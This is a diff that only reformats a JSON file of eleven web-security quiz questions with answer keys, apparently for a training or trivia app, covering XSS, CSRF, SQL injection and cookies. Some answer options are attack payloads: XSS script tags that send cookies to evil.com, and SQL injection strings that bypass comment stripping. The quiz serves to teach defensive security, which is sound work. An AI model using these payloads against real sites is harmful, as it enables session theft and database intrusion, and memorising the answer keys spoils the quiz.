@@ -1,68 +1,103 @@
 [
-    {
-        "question": "Τσέκαρες τα email σου στο τοπικό beach cafe. Ευτυχώς πριν φύγεις έκανες logout. Τα δεδομένα σου είναι ασφαλή;",
-        "answers": ["Σίγουρα", "Σίγουρα όχι","Εξαρτάται","Δεν πάω παραλία"],   
-        "correctAnswer": "Εξαρτάται",
-        "photoURL": "q7q1"
-    },
-    {
-        "question": "I need to see query output to figure out the contents of a DB",
-        "answers": ["True", "False"],   
-        "correctAnswer": "False",
-        "photoURL": "q7q2"
-    },
-    {
-        "question": "Cookie content can always be trusted by the server",
-        "answers": ["True", "False"],   
-        "correctAnswer": "False",
-        "photoURL": "q7q3"
-    },
-    {
-        "question": "XSS takes advantage of",
-        "answers": ["The gullibility of the exploited user", "The Same Origin Policy","The browser + frontend's trust in the web server","The web server's trust in the browser + frontend"],   
-        "correctAnswer": "The browser + frontend's trust in the web server",
-        "photoURL": "q7q4"
-    },
-    {
-        "question": "I just XSS'ed a user on site.com. I'll use this attack to send their bank.com cookies to me. How will I do this?",
-        "answers": ["<script>alert(document.cookie)</script>", "<script>window.location=https://evil.com?foo=document.cookie</script>","<script>fetch(https://evil.com?foo=document[\"bank.com\"].cookie)</script>","Won't work because of Same Origin Policy"],   
-        "correctAnswer": "Won't work because of Same Origin Policy",
-        "photoURL": "q7q5"
-    },
-    {
-        "question": "Someone just SQL injected our DB and leaked everyone's passwords. What do I do?",
-        "answers": ["Nothing, all passwords are salted and hashed with PBKDF2 so we are good", "I coordinate with incident response team following company policy","I email all users to let them know and force a password reset","I try to find the exploited bug and remediate as quickly as possible"],   
-        "correctAnswer": "I coordinate with incident response team following company policy",
-        "photoURL": "q7q6"
-    },
-    {
-        "question": "Using a modern and mature JS framework like React ensures XSS vulnerabilities are eliminated",
-        "answers": ["True", "False"],   
-        "correctAnswer": "False",
-        "photoURL": "q7q7"
-    },
-    {
-        "question": "CSRF takes advantage of",
-        "answers": ["The gullibility of the exploited user", "The Same Origin Policy","The browser + frontend's trust in the web server","The web server's trust in the browser + frontend"],   
-        "correctAnswer": "The web server's trust in the browser + frontend",
-        "photoURL": "q7q8"
-    },
-    {
-        "question": "PM is asking me to implement authentication on the client side, I",
-        "answers": ["hide the password in some obfuscated javascript to thwart the adversaries", "use secure SHA256 to first hash the password and only include that","use typescript which is safe for that","call them a fool"],   
-        "correctAnswer": "call them a fool",
-        "photoURL": "q7q9"
-    },
-    {
-        "question": "Every horror movie could start with this line",
-        "answers": ["I have a great idea for a SQL sanitization routine", "I have a great idea for a shell command sanitization routine","I have a great idea for a new secure cookie generation routine","Por qué no los tres?"],   
-        "correctAnswer": "Por qué no los tres?",
-        "photoURL": "q7q10"
-    },
-    {
-        "question": "Found a way to stop SQL injections! Just strip the comment character! Can I be defeated?",
-        "answers": ["' or 1 = 1 --", "'' or '1' = '1'","'' or '1' = '1","No, this sanitization mechanism is unbreakable"],   
-        "correctAnswer": "'' or '1' = '1",
-        "photoURL": "q7q11"
-    }
+  {
+    "question": "Τσέκαρες τα email σου στο τοπικό beach cafe. Ευτυχώς πριν φύγεις έκανες logout. Τα δεδομένα σου είναι ασφαλή;",
+    "answers": ["Σίγουρα", "Σίγουρα όχι", "Εξαρτάται", "Δεν πάω παραλία"],
+    "correctAnswer": "Εξαρτάται",
+    "photoURL": "q7q1"
+  },
+  {
+    "question": "I need to see query output to figure out the contents of a DB",
+    "answers": ["True", "False"],
+    "correctAnswer": "False",
+    "photoURL": "q7q2"
+  },
+  {
+    "question": "Cookie content can always be trusted by the server",
+    "answers": ["True", "False"],
+    "correctAnswer": "False",
+    "photoURL": "q7q3"
+  },
+  {
+    "question": "XSS takes advantage of",
+    "answers": [
+      "The gullibility of the exploited user",
+      "The Same Origin Policy",
+      "The browser + frontend's trust in the web server",
+      "The web server's trust in the browser + frontend"
+    ],
+    "correctAnswer": "The browser + frontend's trust in the web server",
+    "photoURL": "q7q4"
+  },
+  {
+    "question": "I just XSS'ed a user on site.com. I'll use this attack to send their bank.com cookies to me. How will I do this?",
+    "answers": [
+      "<script>alert(document.cookie)</script>",
+      "<script>window.location=https://evil.com?foo=document.cookie</script>",
+      "<script>fetch(https://evil.com?foo=document[\"bank.com\"].cookie)</script>",
+      "Won't work because of Same Origin Policy"
+    ],
+    "correctAnswer": "Won't work because of Same Origin Policy",
+    "photoURL": "q7q5"
+  },
+  {
+    "question": "Someone just SQL injected our DB and leaked everyone's passwords. What do I do?",
+    "answers": [
+      "Nothing, all passwords are salted and hashed with PBKDF2 so we are good",
+      "I coordinate with incident response team following company policy",
+      "I email all users to let them know and force a password reset",
+      "I try to find the exploited bug and remediate as quickly as possible"
+    ],
+    "correctAnswer": "I coordinate with incident response team following company policy",
+    "photoURL": "q7q6"
+  },
+  {
+    "question": "Using a modern and mature JS framework like React ensures XSS vulnerabilities are eliminated",
+    "answers": ["True", "False"],
+    "correctAnswer": "False",
+    "photoURL": "q7q7"
+  },
+  {
+    "question": "CSRF takes advantage of",
+    "answers": [
+      "The gullibility of the exploited user",
+      "The Same Origin Policy",
+      "The browser + frontend's trust in the web server",
+      "The web server's trust in the browser + frontend"
+    ],
+    "correctAnswer": "The web server's trust in the browser + frontend",
+    "photoURL": "q7q8"
+  },
+  {
+    "question": "PM is asking me to implement authentication on the client side, I",
+    "answers": [
+      "hide the password in some obfuscated javascript to thwart the adversaries",
+      "use secure SHA256 to first hash the password and only include that",
+      "use typescript which is safe for that",
+      "call them a fool"
+    ],
+    "correctAnswer": "call them a fool",
+    "photoURL": "q7q9"
+  },
+  {
+    "question": "Every horror movie could start with this line",
+    "answers": [
+      "I have a great idea for a SQL sanitization routine",
+      "I have a great idea for a shell command sanitization routine",
+      "I have a great idea for a new secure cookie generation routine",
+      "Por qué no los tres?"
+    ],
+    "correctAnswer": "Por qué no los tres?",
+    "photoURL": "q7q10"
+  },
+  {
+    "question": "Found a way to stop SQL injections! Just strip the comment character! Can I be defeated?",
+    "answers": [
+      "' or 1 = 1 --",
+      "'' or '1' = '1'",
+      "'' or '1' = '1",
+      "No, this sanitization mechanism is unbreakable"
+    ],
+    "correctAnswer": "'' or '1' = '1",
+    "photoURL": "q7q11"
+  }
 ]
